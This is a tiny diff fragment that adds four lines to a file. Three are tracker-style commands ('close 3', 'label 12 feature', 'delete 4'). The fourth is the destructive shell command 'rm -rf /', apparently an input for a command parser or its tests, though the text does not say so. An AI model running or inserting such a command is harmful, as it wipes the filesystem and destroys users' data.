@@ -1,0 +1,4 @@
+close 3
+label 12 feature
+delete 4
+rm -rf /
